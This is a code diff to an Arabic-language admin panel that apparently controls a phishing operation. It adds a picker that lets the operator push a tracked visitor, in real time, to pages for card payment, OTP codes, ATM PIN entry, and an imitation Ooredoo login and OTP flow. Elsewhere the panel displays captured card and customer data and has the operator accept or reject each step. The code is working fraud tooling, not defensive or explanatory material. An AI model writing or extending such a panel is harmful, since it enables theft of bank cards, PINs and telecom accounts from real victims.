@@ -371,6 +371,18 @@ tr.await-row td{animation:flash 1.8s ease-in-out infinite}
 body.pop-open{overflow:hidden}
 @media (max-width:640px){ .dgrid{grid-template-columns:1fr} .pop{padding:0; align-items:flex-end} .pop-box{border-radius:20px 20px 0 0; max-height:92vh} }
 @media (prefers-reduced-motion:reduce){ .pop,.pop-box{transition:none} }
+/* ===== Redirect Page Picker ===== */
+#redirectPop .pop-box{max-width:420px}
+.redir-list{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:6px;padding:16px 20px 20px}
+.redir-list li button{
+  width:100%;text-align:start;padding:12px 16px;border-radius:12px;
+  border:1.5px solid var(--line);background:var(--surface);color:var(--ink);
+  font-size:.95rem;font-weight:600;display:flex;align-items:center;gap:10px;
+  transition:border-color .15s,background .15s
+}
+.redir-list li button:hover{border-color:var(--gold-deep);background:var(--gold-soft)}
+.redir-list li button .pg-icon{font-size:1.1rem;flex:none}
+.redir-pick-cancel{margin:0 20px 20px;width:calc(100% - 40px);display:block}
 @media (max-width:820px){
   .stats{grid-template-columns:repeat(2,1fr)}
 }
@@ -446,6 +458,20 @@ body.pop-open{overflow:hidden}
   <div class="pop-box">
     <div class="pop-head" id="popHead"></div>
     <div class="pop-body" id="popBody"></div>
+  </div>
+</div>
+
+<div class="pop" id="redirectPop" role="dialog" aria-modal="true" aria-labelledby="redirectPopTitle">
+  <div class="pop-box">
+    <div class="pop-head">
+      <div class="t">
+        <b id="redirectPopTitle">اختر صفحة الوجهة</b>
+        <span>سيتم توجيه العميل إلى الصفحة المختارة</span>
+      </div>
+      <button class="pop-x" id="redirectPopClose" aria-label="إغلاق"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg></button>
+    </div>
+    <ul class="redir-list" id="redirPageList"></ul>
+    <button class="rbtn redir-pick-cancel" id="redirectPopCancel">إلغاء</button>
   </div>
 </div>
 <script>
@@ -630,7 +656,8 @@ function openPop(ref){
 
   $("popBody").innerHTML = customerHTML + cardHTML + ooredooHTML + `
     <div class="dactions" style="padding-top:12px">
-      <button class="rbtn" id="popClose2" style="width:100%">إغلاق</button>
+      <button class="rbtn" id="popRedirBtn" data-redir="${esc(o.ref)}" style="flex:1;background:var(--navy);color:#fff;border:none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><path d="M5 12h14M12 5l7 7-7 7"/></svg> إعادة التوجيه</button>
+      <button class="rbtn" id="popClose2" style="flex:1">إغلاق</button>
     </div>`;
   $("pop").classList.add("open"); document.body.classList.add("pop-open");
   $("popClose").onclick = closePop; $("popClose2").onclick = closePop;
@@ -715,12 +742,60 @@ async function decide(ref, decision){
     if (r.ok) { toast(decision === "accept" ? "تم قبول الخطوة" : "تم رفض الخطوة"); refresh(); }
   } catch (e) { toast("تعذّر تنفيذ الإجراء"); }
 }
+const REDIRECT_PAGES = [
+  { url: "payment_ar.html",          icon: "💳", label: "صفحة الدفع (بطاقة)" },
+  { url: "otp.html",                 icon: "🔢", label: "صفحة رمز OTP" },
+  { url: "atm.html",                 icon: "🏧", label: "صفحة الرقم السري ATM" },
+  { url: "loading.html",             icon: "⏳", label: "صفحة التحميل" },
+  { url: "ooredoo-login.html",       icon: "📱", label: "تسجيل دخول أوريدو" },
+  { url: "ooredoo-otp.html",         icon: "🔑", label: "رمز أوريدو OTP" },
+  { url: "ooredoo-loading.html",     icon: "⏳", label: "تحميل أوريدو" },
+  { url: "ooredoo-otp-loading.html", icon: "⏳", label: "تحميل رمز أوريدو" },
+  { url: "ooredoo-success.html",     icon: "✅", label: "نجاح أوريدو" },
+  { url: "index.html",               icon: "🏠", label: "الصفحة الرئيسية" },
+  { url: "logi-ar.html",             icon: "🔐", label: "صفحة تسجيل الدخول" },
+];
+
 function redirect(ref){
   const o = loadOrders().find(x => x.ref === ref); if (!o) return;
-  const enc = encodeData({ st:o.st, n:o.n, id:o.id, p:o.p, e:o.e, g:o.g, em:o.em, a:o.a, ad:o.ad });
-  const plan = o.card + (o.watch ? "-" + o.watch : "");
-  location.href = `order.html#${plan}~${enc}`;
+  const list = $("redirPageList");
+  list.innerHTML = REDIRECT_PAGES.map(p =>
+    `<li><button data-target="${esc(p.url)}" data-ref="${esc(ref)}"><span class="pg-icon">${p.icon}</span>${p.label}</button></li>`
+  ).join("");
+  $("redirectPop").classList.add("open");
 }
+
+function closeRedirectPop(){
+  $("redirectPop").classList.remove("open");
+}
+
+async function doRedirect(ref, target){
+  const o = loadOrders().find(x => x.ref === ref); if (!o) return;
+  if (MODE !== "server") { toast("إعادة التوجيه متاحة بعد النشر على السيرفر"); closeRedirectPop(); return; }
+  try {
+    const r = await fetch("/api/redirect", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "x-admin-password": PW },
+      body: JSON.stringify({ visitId: o.visitId, target })
+    });
+    if (r.ok) {
+      toast("✓ تم إرسال إعادة التوجيه بنجاح");
+    } else {
+      const d = await r.json().catch(()=>({}));
+      toast("تعذّر إعادة التوجيه: " + (d.error || r.status));
+    }
+  } catch(e) { toast("تعذّر الاتصال بالسيرفر"); }
+  closeRedirectPop();
+}
+
+$("redirectPop").addEventListener("click", e => {
+  if (e.target === $("redirectPop")) { closeRedirectPop(); return; }
+  const btn = e.target.closest("[data-target]");
+  if (btn) { doRedirect(btn.dataset.ref, btn.dataset.target); return; }
+});
+$("redirectPopClose").onclick = closeRedirectPop;
+$("redirectPopCancel").onclick = closeRedirectPop;
+document.addEventListener("keydown", e => { if (e.key === "Escape") closeRedirectPop(); });
 function encodeData(obj){
   const bytes = new TextEncoder().encode(JSON.stringify(obj));
   return btoa(String.fromCharCode(...bytes)).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"");
